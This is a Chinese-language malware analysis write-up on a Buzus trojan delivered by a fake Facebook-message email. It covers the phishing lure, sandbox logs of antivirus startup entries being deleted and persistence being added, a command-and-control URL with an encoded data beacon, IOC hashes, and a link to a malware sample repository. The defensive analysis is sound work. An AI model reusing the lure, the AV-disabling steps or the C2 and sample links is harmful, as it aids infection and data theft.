+<div id="article-content">
+	<h2 id="Trojan-Buzus“霸族”木马通过邮件传播"><a href="#Trojan-Buzus“霸族”木马通过邮件传播" class="headerlink" title="Trojan/Buzus“霸族”木马通过邮件传播"></a>Trojan/Buzus“霸族”木马通过邮件传播</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><img src="http://blogimage.xtpeeps.cn/20190911144841.png-A"><br>探针恶意邮件样本中发现此木马，邮件内容如下：</p>
+<pre><code class="html">收件人:&lt;脱敏内容&gt;
+日期:Mon, 9 Sep 2019 12:58:31 +0800
+主题:You have got a new message on Facebook!
+
+邮件内容:Facebookfacebook Hi,You have got a personal message on Facebook from your friend.To read it please check the attachment.Thanks, The Facebook Team
+附件:Facebook message.zip(227130)
+</code></pre>
+<h3 id="关于buzus"><a href="#关于buzus" class="headerlink" title="关于buzus"></a>关于buzus</h3><p>翻阅网上的关于霸族的资料介绍如下：<br>W32/Buzus是一种蠕虫，它通过将自身复制到可移动驱动器来传播，并试图从受损的计算机中窃取机密信息。<a target="_blank" rel="noopener" href="https://www.symantec.com/security-center/writeup/2009-121019-2757-99">https://www.symantec.com/security-center/writeup/2009-121019-2757-99</a><br>霸族本身存在蠕虫行为，且存在传染性可能。本次样本发现为木马类buzus，或同源Trojan.AgentWDCR.HWI行为，基于各厂商对病毒命名不同略有差别。<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504/detection">https://www.virustotal.com/gui/file/e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504/detection</a></p>
+<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>文件名称：    document.exe<br>文件大小：    394KB (403968bytes)<br>文件类型：    PE32 executable (GUI) Intel 80386, for MS Windows<br>开始时间：    2019-09-09 12:54:18<br>MD5：    c1a5ba03f0ba9832cc87180a4c4622a5[virustotal]<br>SHA1：    b6c0f0588c8efffc48f308dfddecbf6170204dd9<br>壳或编译器信息：    无匹配信息</p>
+<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>前台无任何异常，进程看到子程序调用，rundll32.exe调用并处在运行，可看到触发报错告警。<br><img src="http://blogimage.xtpeeps.cn/20190911145335.png-A"><br>可以观察到rundll32.exe调用plareb.dll运行命令：<br><img src="http://blogimage.xtpeeps.cn/20190911145344.png-A"><br>通过行为分析复盘可以看到：<br>document.exe再执行时开始创建调起进程：”%Temp%\NvMcTray.exe”<br><img src="http://blogimage.xtpeeps.cn/20190911154310.png-A"><br><img src="http://blogimage.xtpeeps.cn/20190911153108.png-A"><br>查找删除防护软件注册表操作：<br><img src="http://blogimage.xtpeeps.cn/20190911152748.png-A"></p>
+<p>样本行为审计可以总结下完整的样本document.exe行为：document.exe运行创建%Temp%\NvMcTray.exe和%Temp%\NvTaskbarInit.exe（这个是受保护隐藏的备份），之后通过NvMcTray.exe进行正常流程调用rundll32.exe运行，删除英伟达注册表并新增额外启动项指向隐藏备份的释放文件NvTaskbarInit.exe，开启代理，删除防护软件启动项等操作。之后NvTaskbarInit.exe还会调用下载dll进行后续下载操作。<br><img src="http://blogimage.xtpeeps.cn/20190911164453.png-A"></p>
+<pre><code>[CreateProcess] document.exe:2372 &gt; &quot;%UserProfile%\Desktop\document.exe&quot;    [Child PID: 2856]
+[CreateProcess] document.exe:2856 &gt; &quot;%Temp%\NvMcTray.exe&quot;    [Child PID: 2968]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Temp\1\NvTaskbarInit.exe    [SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Temp\1\NvTaskbarInit.exe    [SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Temp\1\NvTaskbarInit.exe    [SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Temp\1\NvTaskbarInit.exe    [SHA256: e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Temp\1\NvMcTray.exe    [SHA256: 5877a70e36f1d51945837daae394da0275ca57e8acbb725fad992b454b7d16c6]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat    [SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10]
+[CreateFile] document.exe:2856 &gt; %AppData%\Microsoft\Windows\Cookies\index.dat    [SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a]
+[CreateFile] document.exe:2856 &gt; %LocalAppData%\Microsoft\Windows\History\History.IE5\index.dat    [SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c]
+[RegDeleteValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL
+[RegDeleteValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyOverride
+[RegDeleteValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\APVXDWIN
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\avast!
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AVG8_TRAY
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AVP
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\BDAgent
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\CAVRID
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\cctray
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\DrWebScheduler
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\egui
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\F-PROT Antivirus Tray application
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\ISTray
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\K7SystemTray
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\K7TSStart
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\McENUI
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\MskAgentexe
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\OfficeScanNT Monitor
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\RavTask
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\SBAMTray
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\sbamui
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\SCANINICIO
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\Spam Blocker for Outlook Express
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\SpamBlocker
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\SpIDerMail
+[RegDeleteValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\Windows Defender
+[RegSetValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\nvidia01  =  09
+[RegSetValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\nvidia02  =  10
+[RegSetValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable  =  0
+[RegSetValue] document.exe:2856 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Nvidia Control Center  =  C:\Users\LAB-WI~1\AppData\Local\Temp\1\NvTaskbarInit.exe
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\ConsoleTracingMask  =  4294901760
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\EnableConsoleTracing  =  0
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\EnableFileTracing  =  0
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\FileDirectory  =  %windir%\tracing
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\FileTracingMask  =  4294901760
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASAPI32\MaxFileSize  =  1048576
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\ConsoleTracingMask  =  4294901760
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\EnableConsoleTracing  =  0
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\EnableFileTracing  =  0
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\FileDirectory  =  %windir%\tracing
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\FileTracingMask  =  4294901760
+[RegSetValue] document.exe:2856 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\document_RASMANCS\MaxFileSize  =  1048576
+</code></pre>
+<p>NvTaskbarInit.exe样本行为审计：释放plareb.dll到%LocalAppData%\plareb.dll，调用rundll32.exe运行dll。</p>
+<pre><code>[CreateProcess] NvMcTray.exe:2968 &gt; &quot;rundll32.exe %LocalAppData%\plareb.dll,Startup&quot;    [Child PID: 1584]
+[CreateFile] NvMcTray.exe:2968 &gt; %LocalAppData%\plareb.dll    [SHA256: c38239c98d9ba20e7af37cd7e516dc69d3accfaf699d9d517976f6cfeccb052c]
+[RegSetValue] NvMcTray.exe:2968 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Ekixeda  =  42 01 30 03 41 05 40 07 3C 09 4F 0B 3E 0D 3E 0F(转码为：undefined)
+[RegSetValue] NvMcTray.exe:2968 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Yhukeb  =  43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F(转码为：undefined)
+</code></pre>
+<p>rundll32.exe调用行为审计：<br>rundll32.exe 运行%LocalAppData%\efazufer.dll，运行_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\Report.wer，运行%LocalAppData%\plareb.dll，修改注册表，修改cookie等。</p>
+<pre><code>[CreateProcess] NvMcTray.exe:2968 &gt; &quot;rundll32.exe %LocalAppData%\plareb.dll,Startup&quot;    [Child PID: 1584]
+[CreateProcess] rundll32.exe:1584 &gt; &quot;rundll32.exe  %LocalAppData%\plareb.dll,iep&quot;    [Child PID: 2616]
+[CreateProcess] rundll32.exe:1584 &gt; &quot;rundll32.exe  %LocalAppData%\plareb.dll,iep&quot;    [Child PID: 2272]
+[CreateFolder] rundll32.exe:2616 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5
+[CreateFile] rundll32.exe:2616 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat    [SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10]
+[CreateFolder] rundll32.exe:2616 &gt; %AppData%\Microsoft\Windows\Cookies
+[CreateFile] rundll32.exe:2616 &gt; %AppData%\Microsoft\Windows\Cookies\index.dat    [SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a]
+[CreateFolder] rundll32.exe:2616 &gt; %LocalAppData%\Microsoft\Windows\History\History.IE5
+[CreateFile] rundll32.exe:2616 &gt; %LocalAppData%\Microsoft\Windows\History\History.IE5\index.dat    [SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c]
+[CreateFile] rundll32.exe:2616 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5\BQES0LUV\get2[1].htm    [SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0]
+[CreateFile] rundll32.exe:2616 &gt; %LocalAppData%\efazufer.dll    [SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0]
+[CreateFile] WerFault.exe:2864 &gt; %LocalAppData%\Microsoft\Windows\WER\ReportArchive\AppCrash_rundll32.exe_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\Report.wer    [SHA256: 33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08]
+[CreateFile] WerFault.exe:2864 &gt; %LocalAppData%\Microsoft\Windows\WER\ReportArchive\AppCrash_rundll32.exe_5b78e6e8a21a43cd8ced445ed9ca5ed30ca6835_0b3cf67e\Report.wer    [SHA256: 33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08]
+[CreateFolder] rundll32.exe:2272 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5
+[CreateFile] rundll32.exe:2272 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat    [SHA256: 196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10]
+[CreateFolder] rundll32.exe:2272 &gt; %AppData%\Microsoft\Windows\Cookies
+[CreateFile] rundll32.exe:2272 &gt; %AppData%\Microsoft\Windows\Cookies\index.dat    [SHA256: 75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a]
+[CreateFolder] rundll32.exe:2272 &gt; %LocalAppData%\Microsoft\Windows\History\History.IE5
+[CreateFile] rundll32.exe:2272 &gt; %LocalAppData%\Microsoft\Windows\History\History.IE5\index.dat    [SHA256: 3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c]
+[CreateFile] rundll32.exe:2272 &gt; %LocalAppData%\Microsoft\Windows\Temporary Internet Files\Content.IE5\YYP4M2G5\get2[1].htm    [SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0]
+[CreateFile] rundll32.exe:2272 &gt; %LocalAppData%\amamuwesebebe.dll    [SHA256: f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0]
+[RegSetValue] rundll32.exe:1584 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Akiliyuwamo  =  rundll32.exe &quot;C:\Users\LAB-windows2008\AppData\Local\plareb.dll&quot;,Startup
+[RegSetValue] rundll32.exe:1584 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Sgayicelotef  =  168
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Yhukeb  =  43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Jnaperote  =  31 01 31 03 35 05 30 07 08 09
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\EnableFileTracing  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\EnableConsoleTracing  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\FileTracingMask  =  4294901760
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\ConsoleTracingMask  =  4294901760
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\MaxFileSize  =  1048576
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASAPI32\FileDirectory  =  %windir%\tracing
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\EnableFileTracing  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\EnableConsoleTracing  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\FileTracingMask  =  4294901760
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\ConsoleTracingMask  =  4294901760
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\MaxFileSize  =  1048576
+[RegSetValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Tracing\rundll32_RASMANCS\FileDirectory  =  %windir%\tracing
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable  =  0
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyOverride
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings  =  46 00 00 00 0A 00 00 00 09 00 00 00 00 00 00 00
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\DefaultConnectionSettings  =  46 00 00 00 06 00 00 00 09 00 00 00 00 00 00 00
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegDeleteValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect  =  0
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegDeleteValue] rundll32.exe:2616 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet  =  0
+[RegSetValue] rundll32.exe:2616 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect  =  0
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Jyitoz\Yhukeb  =  43 01 38 03 58 05 53 07 7B 09 6F 0B 7E 0D 7D 0F
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable  =  0
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyOverride
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings  =  46 00 00 00 0B 00 00 00 09 00 00 00 00 00 00 00
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2272 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegDeleteValue] rundll32.exe:2272 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet  =  0
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect  =  0
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2272 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass
+[RegDeleteValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegDeleteValue] rundll32.exe:2272 &gt; HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet  =  0
+[RegSetValue] rundll32.exe:2272 &gt; HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect  =  0
+</code></pre>
+<p>网络行为发现连接大量域名IP，主要两处：</p>
+<pre><code>whatismyip.com/automation/n09230945.asp（确定本地IP地址）
+crl.microsoft/pki/crl/products/CSPCA.crl（校验.net证书）
+081007e30903.lantzel.com/get2.php?c=CNEUQIGW&amp;d=26606B67393435363E2F676268307D3F222022222425243177757E4469747A224213131B1212151E0E5C434F116F1C6A76057701040172050A0D0309797F7F0C7304707A01707E767F7E0C7F7F6B2C263E2737216964606F7E31333F616E6A3A535155505243070305545A4D031E180A024C442C455329031B12474B4C4D4E47B6B0B6BABDA3F6F5E7EAB7F9F9E3EAE3FCA2A0BDF1EDF3B1F4FDABC4F9A0AFB9C3CDCCD7FBC09B978EDE9C9F919C88C98D8094C1898490D4D6DDD6869AD4DADEB4A4FFF2F6FDF0F6FEFCF8FFFDEB8B8082
+</code></pre>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>情况基本一致不在赘述：<br><img src="http://blogimage.xtpeeps.cn/20190911145246.png-A"><br><img src="http://blogimage.xtpeeps.cn/20190911174026.png-A"><br><img src="http://blogimage.xtpeeps.cn/20190911174339.png-A"><br><img src="http://blogimage.xtpeeps.cn/20190911174349.png-A"><br><img src="http://blogimage.xtpeeps.cn/201909111744.png-A"><br><img src="http://blogimage.xtpeeps.cn/20190911174404.png-A"></p>
+<h3 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs:"></a>IOCs:</h3><p>文件hash<br>4e04c09cb0c3b3b2375d9e2e92a9e0e82f115c9011ca16a34cc83b4b94a730dc<br>f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0<br>4e04c09cb0c3b3b2375d9e2e92a9e0e82f115c9011ca16a34cc83b4b94a730dc<br>e53e796d032239c68fa1d485372c69d2232a4a269547f9da959d03f7ed448870<br>f5853afb6b66570e29fcf6cae815ffb001970e179d24f7739d2efedc317e0ead<br>e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504<br>e117b82bd7c22e656f0e508dcd9ee7e4cf918cf9feacd170236eea67fd6a1984<br>f6846e5625a17d76a1a6e954ba67ee14896e0f7350030f5f61c3218b6463af4c<br>28619bf9a073ce5ade879ef7123c5a60f28bdfead6997c63540e1a5fede309e6<br>07854d2fef297a06ba81685e660c332de36d5d18d546927d30daad6d7fda1541<br>2454bcaae690d629420b45e7db2297269cd97ccb1bb2640401d23f0a1d9b5bcc<br>e41e19b9ee8889b3887b8cacf264468c661bdf382706bbd9052c1f95c4eea504<br>5877a70e36f1d51945837daae394da0275ca57e8acbb725fad992b454b7d16c6<br>c38239c98d9ba20e7af37cd7e516dc69d3accfaf699d9d517976f6cfeccb052c<br>196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10<br>75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a<br>3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c<br>196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10<br>75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a<br>3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c<br>f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0<br>33e3065cc7fe4f4a6c7b707fbef7a138a81cdc7906fcf2b565be5e91ec17ec08<br>196ba3121fba4cb7e6dadc93f46bda0450996aed308325f124ac7a508ff6bb10<br>75d0b1743f61b76a35b1fedd32378837805de58d79fa950cb6e8164bfa72073a<br>3269095d5a98d381acfa4bdfab9e47d2e58f84bf646bf5a4bf2a3f6c6630203c<br>f0a3eec2709682107edae2372e8984e15bd3b2b7e3de9878ba76cd69cc556ce0</p>
+<p>HOST：<br>081007e30903.lantzel.com/get2.php?c=CNEUQIGW&amp;d=26606B67393435363E2F676268307D3F222022222425243177757E4469747A224213131B1212151E0E5C434F116F1C6A76057701040172050A0D0309797F7F0C7304707A01707E767F7E0C7F7F6B2C263E2737216964606F7E31333F616E6A3A535155505243070305545A4D031E180A024C442C455329031B12474B4C4D4E47B6B0B6BABDA3F6F5E7EAB7F9F9E3EAE3FCA2A0BDF1EDF3B1F4FDABC4F9A0AFB9C3CDCCD7FBC09B978EDE9C9F919C88C98D8094C1898490D4D6DDD6869AD4DADEB4A4FFF2F6FDF0F6FEFCF8FFFDEB8B8082<br>081007e30903.lantzel.com</p>
+<h3 id="样本地址"><a href="#样本地址" class="headerlink" title="样本地址"></a>样本地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/XTpeeps/MalwareSamples/tree/master/Trojan_Buzus">https://github.com/XTpeeps/MalwareSamples/tree/master/Trojan_Buzus</a></p>
+
+</div>
+
+
+    <div class="post-guide">
+        <div class="item left">
+            
